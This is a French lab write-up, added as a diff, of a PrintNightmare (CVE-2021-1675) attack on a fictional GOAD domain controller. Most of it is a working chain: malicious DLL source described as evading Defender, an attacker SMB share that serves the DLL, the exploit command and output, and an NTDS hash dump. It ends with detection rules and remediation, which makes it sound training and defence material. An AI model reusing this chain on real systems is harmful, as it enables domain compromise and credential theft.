@@ -450,3 +450,273 @@ graph TD
 
 *Auteur : Nadyr Chouarhi (hik3nR00t) | HikenRoot Forge | Mars 2026*
 *Environnement : GOAD v3 — MediaTech Groupe SA (fictif)*
+
+---
+
+# SC-AD-005b — PrintNightmare (CVE-2021-1675)
+
+## Classification
+
+| Champ | Valeur |
+|-------|--------|
+| **Code scénario** | SC-AD-005b |
+| **Nom** | PrintNightmare — RCE via Print Spooler |
+| **Cible** | MEEREEN — DC03 essos.local (192.168.10.12) |
+| **VLAN** | 10 — AD Lab (192.168.10.0/24) |
+| **Sévérité** | 🔴 Critique |
+| **CVSS 3.1** | 8.8 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H) |
+| **CVE** | CVE-2021-1675 |
+| **MITRE ATT&CK** | T1068 (Exploitation for Privilege Escalation), T1136 (Create Account), T1003.003 (NTDS) |
+| **Mayfly Reference** | Part 5 — https://mayfly277.github.io/posts/GOADv2-pwning-part5/ |
+| **Prérequis** | Compte de domaine essos valide (jorah.mormont:H0nnor!) |
+| **Résultat** | SYSTEM sur MEEREEN DC — DCSync essos.local complet |
+| **Date** | Mars 2026 |
+| **Auteur** | Nadyr Chouarhi (hik3nR00t) |
+
+---
+
+## Résumé exécutif
+
+### Pour un recruteur
+
+PrintNightmare exploite une vulnérabilité dans le service Windows Print Spooler pour exécuter du code arbitraire en tant que **SYSTEM**. Avec un simple compte de domaine `jorah.mormont`, le service spooler de MEEREEN (DC essos.local) charge une DLL malveillante depuis un partage SMB Kali, créant un compte administrateur de domaine. Le DCSync complet sur essos.local en résulte — 20 hashes NTLM extraits incluant `krbtgt` et `Administrator`.
+
+### Pour un auditeur ISO 27001 / NIS2
+
+- **A.8.8 (Management of Technical Vulnerabilities)** — CVE-2021-1675 publiée en juin 2021, patch disponible depuis juillet 2021. MEEREEN non patché au moment de l'exploitation.
+- **A.8.2 (Privileged Access Rights)** — Le service Print Spooler tourne en contexte SYSTEM sur un DC. Aucune justification métier d'activer l'impression sur un contrôleur de domaine.
+- **A.8.15 (Logging)** — Aucune détection du chargement de DLL externe via le spooler.
+- **NIS2 Art. 21 §2(e)** — Absence de gestion des vulnérabilités critiques sur infrastructure d'authentification.
+
+### Pour un RSSI
+
+Le service Print Spooler n'a aucune légitimité sur un DC. Son activation expose l'infrastructure d'authentification à une compromission totale via un vecteur réseau sans interaction utilisateur. La désactivation du spooler sur tous les DC est une mesure de durcissement fondamentale documentée depuis 2021.
+
+---
+
+## Kill Chain
+
+```mermaid
+sequenceDiagram
+    participant K as Kali (jorah.mormont)
+    participant S as SMB Share (10.10.10.2)
+    participant M as MEEREEN Spooler (SYSTEM)
+    participant AD as essos.local AD
+
+    K->>K: Compilation DLL adduser (mingw32-gcc)
+    K->>S: impacket-smbserver ATTACKERSHARE /tmp
+    K->>M: CVE-2021-1675.py RpcAddPrinterDriverEx
+    M->>S: Charge pnightmare2.dll depuis UNC path
+    M->>AD: NetUserAdd pnightmare2 en tant que SYSTEM
+    M->>AD: NetLocalGroupAddMembers Administrators
+    K->>M: netexec smb --ntds
+    M->>K: 20 hashes NTLM essos.local
+```
+
+---
+
+## Phases d'exploitation
+
+### Phase 1 — Vérification du service Spooler
+
+```bash
+netexec smb 192.168.10.12 -u jorah.mormont -p 'H0nnor!' -d essos.local -M spooler
+```
+
+```
+SPOOLER  192.168.10.12  445  MEEREEN  Spooler service enabled
+```
+
+---
+
+### Phase 2 — Compilation de la DLL malveillante
+
+Payload qui utilise les API Win32 natives `NetUserAdd` + `LookupAccountName` + `NetLocalGroupAddMembers` pour bypass Defender WS2016.
+
+```bash
+cat > /tmp/adduser2.c << 'EOF'
+#define UNICODE
+#define _UNICODE
+#include <windows.h>
+#include <lmaccess.h>
+#include <lmerr.h>
+#include <tchar.h>
+
+DWORD CreateAdminUserInternal(void) {
+    NET_API_STATUS rc;
+    BOOL b;
+    USER_INFO_1 ud;
+    LOCALGROUP_MEMBERS_INFO_0 gd;
+    SID_NAME_USE snu;
+    DWORD cbSid = 256;
+    BYTE Sid[256];
+    DWORD cbDomain = 256 / sizeof(TCHAR);
+    TCHAR Domain[256];
+    memset(&ud, 0, sizeof(ud));
+    ud.usri1_name        = _T("pnightmare2");
+    ud.usri1_password    = _T("Test123456789!");
+    ud.usri1_priv        = USER_PRIV_USER;
+    ud.usri1_flags       = UF_SCRIPT | UF_NORMAL_ACCOUNT;
+    ud.usri1_script_path = NULL;
+    rc = NetUserAdd(NULL, 1, (LPBYTE)&ud, NULL);
+    if (rc != NERR_Success) return rc;
+    b = LookupAccountName(NULL, ud.usri1_name, Sid, &cbSid, Domain, &cbDomain, &snu);
+    if (!b) return GetLastError();
+    memset(&gd, 0, sizeof(gd));
+    gd.lgrmi0_sid = (PSID)Sid;
+    NetLocalGroupAddMembers(NULL, _T("Administrators"), 0, (LPBYTE)&gd, 1);
+    return 0;
+}
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
+    if (ul_reason_for_call == DLL_PROCESS_ATTACH) CreateAdminUserInternal();
+    return TRUE;
+}
+EOF
+
+x86_64-w64-mingw32-gcc -shared -o /tmp/pnightmare2.dll /tmp/adduser2.c -lnetapi32
+```
+
+> **Note** : Le payload `net user` simple est détecté par Defender WS2016. L'API Win32 directe via `LookupAccountName` + `NetLocalGroupAddMembers` avec SID bypass la détection.
+
+---
+
+### Phase 3 — Montage du partage SMB
+
+```bash
+sudo impacket-smbserver ATTACKERSHARE /tmp -smb2support
+```
+
+---
+
+### Phase 4 — Exploitation PrintNightmare
+
+```bash
+python3 /home/hiken/VHL/VHL_Pro/WKS_101/CVE-2021-1675/CVE-2021-1675.py essos.local/jorah.mormont:'H0nnor!'@192.168.10.12 '\\10.10.10.2\ATTACKERSHARE\pnightmare2.dll'
+```
+
+```
+[*] Connecting to ncacn_np:192.168.10.12[\PIPE\spoolss]
+[+] Bind OK
+[+] pDriverPath Found C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_7b3eed059f4c3e41\Amd64\UNIDRV.DLL
+[*] Executing \??\UNC\10.10.10.2\ATTACKERSHARE\pnightmare2.dll
+[*] Try 1...
+[*] Stage0: 0
+[*] Try 2...
+[*] Stage0: 0
+[*] Stage5: 0
+[+] Exploit Completed
+```
+
+---
+
+### Phase 5 — Validation et DCSync
+
+```bash
+netexec smb 192.168.10.12 -u pnightmare2 -p 'Test123456789!' -d essos.local
+```
+
+```
+SMB  192.168.10.12  445  MEEREEN  [+] essos.local\pnightmare2:Test123456789! (Pwn3d!)
+```
+
+```bash
+netexec smb 192.168.10.12 -u pnightmare2 -p 'Test123456789!' -d essos.local --ntds
+```
+
+```
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1d8956cac33793f4d9f14f67eb40ec2a:::
+daenerys.targaryen:1114:aad3b435b51404eeaad3b435b51404ee:34534854d33b398b66684072224bb47a:::
+viserys.targaryen:1115:aad3b435b51404eeaad3b435b51404ee:d96a55df6bef5e0b4d6d956088036097:::
+jorah.mormont:1117:aad3b435b51404eeaad3b435b51404ee:4d737ec9ecf0b9955a161773cfed9611:::
+missandei:1118:aad3b435b51404eeaad3b435b51404ee:1b4fd18edf477048c7a7c32fda251cec:::
+[+] Dumped 20 NTDS hashes to /home/hiken/.nxc/logs/ntds/MEEREEN_192.168.10.12_2026-03-02_192742.ntds
+```
+
+---
+
+### Phase 6 — Nettoyage OPSEC
+
+```bash
+netexec smb 192.168.10.12 -u pnightmare2 -p 'Test123456789!' -d essos.local -x 'net user pnightmare /delete && net user pnightmare2 /delete'
+```
+
+> **Traces résiduelles** : Les DLL chargées restent dans `C:\Windows\System32\spool\drivers\x64\3\` et `C:\Windows\System32\spool\drivers\x64\3\Old\`. Suppression manuelle requise si accès WinRM disponible.
+
+---
+
+## Credentials récupérés
+
+| Compte | Hash NTLM | Type | Domaine |
+|--------|-----------|------|---------|
+| Administrator | 54296a48cd30259cc88095373cec24da | Domain Admin | essos.local |
+| krbtgt | 1d8956cac33793f4d9f14f67eb40ec2a | Compte Kerberos | essos.local |
+| daenerys.targaryen | 34534854d33b398b66684072224bb47a | Utilisateur | essos.local |
+| viserys.targaryen | d96a55df6bef5e0b4d6d956088036097 | Utilisateur | essos.local |
+| jorah.mormont | 4d737ec9ecf0b9955a161773cfed9611 | Utilisateur | essos.local |
+| missandei | 1b4fd18edf477048c7a7c32fda251cec | Utilisateur | essos.local |
+
+---
+
+## Détection SOC / SIEM
+
+| Event ID | Description | Indicateur |
+|----------|-------------|------------|
+| **4697** | Service installé | Driver imprimante chargé depuis UNC path |
+| **7045** | Nouveau service | Spooler charge DLL externe |
+| **4741** | Compte créé | pnightmare/pnightmare2 créés par SYSTEM |
+| **4728** | Membre ajouté au groupe | Ajout dans Administrators |
+
+### Règle Sigma
+
+```yaml
+title: PrintNightmare DLL Load via Spooler
+id: sc-ad-005b-001
+status: experimental
+description: Detecte le chargement d'une DLL depuis un chemin UNC par le spooler
+logsource:
+    product: windows
+    service: system
+detection:
+    selection:
+        EventID: 7045
+        ServiceFileName|contains: '\??\UNC\'
+    condition: selection
+level: critical
+tags:
+    - attack.t1068
+    - cve-2021-1675
+```
+
+---
+
+## Remédiation
+
+| Priorité | Action | Commande | Délai |
+|----------|--------|----------|-------|
+| CRITIQUE | Désactiver spooler sur tous les DC | `Stop-Service Spooler; Set-Service Spooler -StartupType Disabled` | 0-24h |
+| CRITIQUE | Appliquer KB5004945 + KB5004946 | Windows Update / WSUS | 0-24h |
+| CRITIQUE | Rotation krbtgt essos.local (x2) | `Set-ADAccountPassword -Identity krbtgt` | 0-24h |
+| ELEVE | Bloquer les chemins UNC pour le spooler | GPO — Point and Print Restrictions | J+1 |
+
+### Commande de désactivation immédiate sur tous les DC
+
+```powershell
+# A executer sur MEEREEN
+Stop-Service -Name Spooler -Force
+Set-Service -Name Spooler -StartupType Disabled
+```
+
+---
+
+## Références
+
+| Référence | URL |
+|-----------|-----|
+| Mayfly277 GOAD Part 5 | https://mayfly277.github.io/posts/GOADv2-pwning-part5/ |
+| CVE-2021-1675 | https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675 |
+| cube0x0 exploit | https://github.com/cube0x0/CVE-2021-1675 |
+| KB5004945 patch | https://support.microsoft.com/kb/5004945 |
+| MITRE T1068 | https://attack.mitre.org/techniques/T1068/ |
+
